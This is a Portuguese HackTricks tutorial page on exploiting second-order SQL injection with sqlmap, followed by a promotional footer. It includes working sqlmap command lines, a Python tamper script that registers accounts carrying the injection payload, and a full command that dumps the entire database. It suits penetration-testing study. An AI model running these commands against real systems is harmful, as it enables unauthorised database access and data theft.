**SQLMap pode explorar Segundas Ordens SQLis.**\
Voc√™ precisa fornecer:

* A **requisi√ß√£o** onde o **payload de inje√ß√£o SQL** ser√° salvo
* A **requisi√ß√£o** onde o **payload** ser√° **executado**

A requisi√ß√£o onde o payload de inje√ß√£o SQL √© salvo √© **indicada como em qualquer outra inje√ß√£o no sqlmap**. A requisi√ß√£o **onde o sqlmap pode ler a sa√≠da/execu√ß√£o** da inje√ß√£o pode ser indicada com `--second-url` ou com `--second-req` se voc√™ precisar indicar uma requisi√ß√£o completa de um arquivo.

**Exemplo simples de segunda ordem:**
```bash
#Get the SQL payload execution with a GET to a url
sqlmap -r login.txt -p username --second-url "http://10.10.10.10/details.php"

#Get the SQL payload execution sending a custom request from a file
sqlmap -r login.txt -p username --second-req details.txt
```
Em v√°rios casos, isso n√£o ser√° suficiente porque voc√™ precisar√° realizar outras a√ß√µes al√©m de enviar a carga √∫til e acessar uma p√°gina diferente.

Quando isso for necess√°rio, voc√™ pode usar um **sqlmap tamper**. Por exemplo, o seguinte script registrar√° um novo usu√°rio **usando a carga √∫til do sqlmap como email** e sair√°.
```python
#!/usr/bin/env python

import re
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def login_account(payload):
    proxies = {'http':'http://127.0.0.1:8080'}
    cookies = {"PHPSESSID": "6laafab1f6om5rqjsbvhmq9mf2"}

    params = {"username":"asdasdasd", "email":payload, "password":"11111111"}
    url = "http://10.10.10.10/create.php"
    pr = requests.post(url, data=params, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

    url = "http://10.10.10.10/exit.php"
    pr = requests.get(url, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    login_account(payload)
    return payload
```
Um **tamper do SQLMap √© sempre executado antes de iniciar uma tentativa de inje√ß√£o com uma carga √∫til** **e ele tem que retornar uma carga √∫til**. Neste caso, n√£o nos importamos com a carga √∫til, mas nos importamos em enviar algumas solicita√ß√µes, para que a carga √∫til n√£o seja alterada.

Portanto, se por algum motivo precisarmos de um fluxo mais complexo para explorar a inje√ß√£o de SQL de segunda ordem, como:

* Criar uma conta com a carga √∫til SQLi dentro do campo "email"
* Sair
* Fazer login com essa conta (login.txt)
* Enviar uma solicita√ß√£o para executar a inje√ß√£o de SQL (second.txt)

**Esta linha do sqlmap ajudar√°:**
```bash
sqlmap --tamper tamper.py -r login.txt -p email --second-req second.txt --proxy http://127.0.0.1:8080 --prefix "a2344r3F'" --technique=U --dbms mysql --union-char "DTEC" -a
##########
# --tamper tamper.py : Indicates the tamper to execute before trying each SQLipayload
# -r login.txt : Indicates the request to send the SQLi payload
# -p email : Focus on email parameter (you can do this with an "email=*" inside login.txt
# --second-req second.txt : Request to send to execute the SQLi and get the ouput
# --proxy http://127.0.0.1:8080 : Use this proxy
# --technique=U : Help sqlmap indicating the technique to use
# --dbms mysql : Help sqlmap indicating the dbms
# --prefix "a2344r3F'" : Help sqlmap detecting the injection indicating the prefix
# --union-char "DTEC" : Help sqlmap indicating a different union-char so it can identify the vuln
# -a : Dump all
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
